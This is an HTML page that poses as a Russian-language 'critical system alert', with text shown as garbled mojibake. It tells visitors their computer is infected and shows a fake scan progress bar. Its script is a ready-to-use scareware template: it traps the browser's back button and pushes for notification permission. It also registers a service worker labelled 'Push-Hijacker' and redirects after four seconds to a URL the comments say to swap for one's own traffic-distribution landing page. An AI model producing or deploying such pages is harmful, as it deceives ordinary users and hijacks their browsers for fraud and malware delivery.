<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>üõ°Ô∏è CRITICAL SYSTEM ALERT</title>
    <style>
        body {
            margin: 0; padding: 40px;
            font-family: Arial, sans-serif;
            background: linear-gradient(#110000, #330000);
            color: #ffdddd;
            text-align: center;
            height: 100vh;
        }
        h1 { font-size: 2.8em; color: #ff2222; text-shadow: 0 0 20px red; }
        .scan { font-size: 22px; margin: 30px 0; }
        #progress { color: #00ff00; font-weight: bold; }
    </style>
</head>
<body>
    <h1>üö® –í–ê–® –ö–û–ú–ü–¨–Æ–¢–ï–† –ó–ê–†–ê–ñ–Å–ù!</h1>
    <h2>–û–±–Ω–∞—Ä—É–∂–µ–Ω–æ 5 –∫—Ä–∏—Ç–∏—á–µ—Å–∫–∏—Ö –≤–∏—Ä—É—Å–æ–≤</h2>
    <p>–†–∞–∑—Ä–µ—à–∏—Ç–µ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –¥–ª—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–π –æ—á–∏—Å—Ç–∫–∏</p>
    
    <div class="scan">
        –°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ —Å–∏—Å—Ç–µ–º—ã: <span id="progress">73%</span>
    </div>

    <script>
        // 1. History trap (–±–ª–æ–∫–∏—Ä–æ–≤–∫–∞ –∫–Ω–æ–ø–∫–∏ –ù–∞–∑–∞–¥)
        function trapBack() {
            for (let i = 0; i < 15; i++) {
                history.pushState({page: i}, '', location.href + '#trap' + i);
            }
            window.addEventListener('popstate', () => history.forward());
        }

        // 2. Notification hijack
        async function hijack() {
            if (!('Notification' in window)) return;
            const perm = await Notification.requestPermission();
            if (perm === 'granted') registerSW();
        }

        // 3. Register Service Worker
        async function registerSW() {
            if (!('serviceWorker' in navigator)) return;
            try {
                const reg = await navigator.serviceWorker.register('/sw.js', {scope: '/'});
                console.log('‚úÖ Push-Hijacker SW registered');
            } catch (e) { console.error(e); }
        }

        // 4. TDS redirect —á–µ—Ä–µ–∑ 4 —Å–µ–∫—É–Ω–¥—ã (–≤ –ª—é–±–æ–º —Å–ª—É—á–∞–µ)
        function tdsRedirect() {
            // ‚Üê‚Üê‚Üê‚Üê‚Üê‚Üê‚Üê‚Üê‚Üê‚Üê‚Üê‚Üê‚Üê‚Üê‚Üê‚Üê‚Üê‚Üê‚Üê‚Üê‚Üê‚Üê‚Üê‚Üê‚Üê‚Üê‚Üê‚Üê‚Üê‚Üê‚Üê‚Üê‚Üê‚Üê
            window.location.replace('https://example.com'); // ‚Üê –ó–∞–º–µ–Ω–∏ –Ω–∞ —Å–≤–æ–π TDS-–ª–µ–Ω–¥–∏–Ω–≥
        }

        // Init
        window.onload = () => {
            trapBack();
            hijack();
            setTimeout(tdsRedirect, 4000);

            // Fake progress
            let p = 73;
            setInterval(() => {
                p = Math.min(99, p + Math.random() * 7);
                document.getElementById('progress').textContent = Math.floor(p) + '%';
            }, 280);
        };
    </script>
</body>
</html>
